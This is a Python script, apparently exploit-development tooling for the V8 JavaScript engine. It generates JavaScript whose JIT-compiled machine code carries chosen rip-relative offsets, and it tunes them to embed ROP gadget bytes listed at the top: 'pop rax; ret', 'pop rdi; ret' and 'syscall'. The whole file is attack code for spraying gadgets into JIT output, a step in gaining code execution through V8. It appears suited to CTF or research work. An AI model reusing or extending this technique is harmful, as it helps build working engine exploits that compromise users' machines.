import sys
import pathlib
from typing import List 
import random
import time
import os

gadgets = ['c358', 'c35f', 'c35f', 'c35f', '050f']
exec_path = ''


def excute_js(js: str, res: str) -> bool:
    f = open(res + '.js', 'w')
    f.write(js)
    f.close()
    os.system(exec_path + ' --print-opt-code ' + res + '.js > ' + res + '.txt')


def get_offset(log: str) -> List[int]:
    f = open(log, 'r')
    lines = f.readlines()
    res = []
    for line in lines:
        if line.find('rip+') != -1 and line.find('movq ') != -1:
            res.append(int(line[line.find('+0x') + 7:-2], 16))

    return res


# 可以知道增加一条xor指令会增加4个长度的offset
# 那么如果最后一个字节相差4的倍数就能很容易出现。
# 如果最后一个字节不是相差4的倍数就要倒数第二个字节了

header = '''
function payload(v1) {
'''
tail =  '''
	return v1;
}


for (var i = 0; i < 0x10000; i++) {
	payload(i % 32);
}
'''


def generate_jsc(count1: int, count2) -> str:
    global header
    global tail

    # 0x24
    jsc = ''
    for i in range(count1):
        jsc += '\tv1 += 0x' + '%x' % ((i) % 0x80) + ';\n'
        jsc += '\tv1 ^= 0x' + '%x' % ((i) % 0x80) + ';\n'

    # 0x4B
    for i in range(count2):
        jsc += '\tv1 *= 0x' + '%x' % ((0x81 + i) % 0x10000) + ';\n'
        jsc += '\tv1 -= 0x' + '%x' % ((0x81 + i) % 0x10000) + ';\n'
        jsc += '\tv1 &=  0xff;\n'

    return header + jsc + tail


if __name__ == '__main__':
    if len(sys.argv) != 2:
        print('plese input the path of v8')
        exit()

    exec_path = sys.argv[1]
    p = pathlib.Path(exec_path)
    if not p.is_file():
        print('path of v8 error')
        exit()

    template1 = generate_jsc(0x20, 0x20)
    excute_js(template1, 'test')
    offsets = get_offset('test.txt')
    unique_set = set(offsets)
    template2 = generate_jsc(0x20, 0x21)
    excute_js(template2, 'test')
    offsets = get_offset('test.txt')
    unique_set |= set(offsets)
    # print(["%x"%i for i in unique_set])s
    base_js = generate_jsc(0x20, 0x22)
    excute_js(base_js, 'test')
    offsets = get_offset('test.txt')
    bases = [i for i in offsets if i not in unique_set]
    print(bases)
    gad_map = {}
    for gadget in gadgets:
        for base in bases:
            if (base - int(gadget, 16)) % 3 == 0:
                d1 = (base - int(gadget, 16)) // 3
                d2 = d1 * -2
                old2 = d2
                d2 %= 25
                d1 += (d2 - old2) * 12 // 25
                gad_map[gadget] = [d2, d1]

    print(gad_map) 
    for k in gad_map.keys():
        v = gad_map[k]
        print(v)
        js = generate_jsc(0x20 + v[0], 0x22 + v[1])
        excute_js(js, k)
        offsets =  get_offset(k + '.txt')
        rel_offsets = [i for i in offsets if i not in unique_set]
        print(rel_offsets)

    # for i in range(0x22, 0xff):
    #     jsc = generate_jsc(0x20, i)
    #     excute_js(jsc, 'test')
    #     tmp_offsets = get_offset('test.txt')
    #     rel_offsets = [i for i in tmp_offsets if i not in unique_set]
    #     print(i, ['%x' % i for i in rel_offsets])
    #     unique_set |= set(tmp_offsets)

    # jsc = generate_jsc(0, 50)
    # excute_js(jsc, 'test')
        
    # for gadget in gadgets:
    #     dd = 4
    #     dbase = 0
    #     for base in offsets:
    #         tmp = (base - int(gadget, 16)) % 4
    #         if tmp < dd:
    #             dd = tmp
    #             dbase = base
    #     offset = dbase - int(gadget, 16)
    #     dd2 = offset - 17 * dd
    #     if dd2 % 4 != 0:
    #         print('value error!', offset, dd, dd2)
    #     gad_map[gadget] = [dbase, dd, dd2 // 4]

    # print(gad_map)

    # for k in gad_map.keys():
    #     v = gad_map[k]
    #     js = generate_jsc(v[2], v[1])
    #     excute_js(js, k)